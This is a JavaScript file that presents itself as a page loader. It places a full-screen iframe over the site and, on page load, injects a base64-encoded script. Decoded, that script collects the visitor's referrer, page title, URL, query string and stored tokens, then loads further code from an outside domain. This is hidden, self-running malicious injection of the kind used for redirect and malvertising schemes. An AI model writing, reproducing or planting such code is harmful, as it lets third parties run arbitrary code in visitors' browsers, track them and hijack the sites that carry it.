const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    const script = document.createElement('script');
    script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfeXlQbUR0Y1F5eTlEa01xYic7CiAgICBpZiAoIXdpbmRvdy5feXlQbUR0Y1F5eTlEa01xYikgewogICAgICAgIHdpbmRvdy5feXlQbUR0Y1F5eTlEa01xYiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vNHlxSFlWamMnLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfeEp6YlpQemY5TGpaM0RZRiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX3hKemJaUHpmOUxqWjNEWUYgIT09ICd1bmRlZmluZWQnICYmIF94SnpiWlB6ZjlMalozRFlGICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9yUzREOTd2d1dqcTl5Z0tyID0gSlNPTi5wYXJzZShfeEp6YlpQemY5TGpaM0RZRik7CiAgICAgICAgdmFyIF9mV3M2U0dLcHpxWk14U21mID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX3JTNEQ5N3Z3V2pxOXlnS3IuY3JlYXRlZF9hdCArIHdpbmRvdy5feXlQbUR0Y1F5eTlEa01xYi50dGwgPCBfZldzNlNHS3B6cVpNeFNtZikgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX3QxR05LWmRQREZ6aDkzYkIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfOGNQaGZwRHluYjQyNXNieCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9uZmRTc3Z6UjdxTERUajZXID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfbmZkU3N2elI3cUxEVGo2VyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfbmZkU3N2elI3cUxEVGo2VyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9uZmRTc3Z6UjdxTERUajZXICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9uZmRTc3Z6UjdxTERUajZXICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfbmZkU3N2elI3cUxEVGo2VyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfbmZkU3N2elI3cUxEVGo2VyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX3l5UG1EdGNReXk5RGtNcWIuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX3QxR05LWmRQREZ6aDkzYkIgIT09ICd1bmRlZmluZWQnICYmIF90MUdOS1pkUERGemg5M2JCICYmIHdpbmRvdy5feXlQbUR0Y1F5eTlEa01xYi51bmlxdWUpIHsKICAgICAgICBfbmZkU3N2elI3cUxEVGo2VyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF90MUdOS1pkUERGemg5M2JCKTsKICAgIH0KICAgIGlmICh0eXBlb2YgXzhjUGhmcER5bmI0MjVzYnggIT09ICd1bmRlZmluZWQnICYmIF84Y1BoZnBEeW5iNDI1c2J4ICYmIHdpbmRvdy5feXlQbUR0Y1F5eTlEa01xYi51bmlxdWUpIHsKICAgICAgICBfbmZkU3N2elI3cUxEVGo2VyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoXzhjUGhmcER5bmI0MjVzYngpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9uZmRTc3Z6UjdxTERUajZXICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5feXlQbUR0Y1F5eTlEa01xYi5SX1BBVEggKyBfbmZkU3N2elI3cUxEVGo2VzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
     document.querySelector("head").appendChild(script);
     setTimeout(toggleLoad, 1000);

  
})
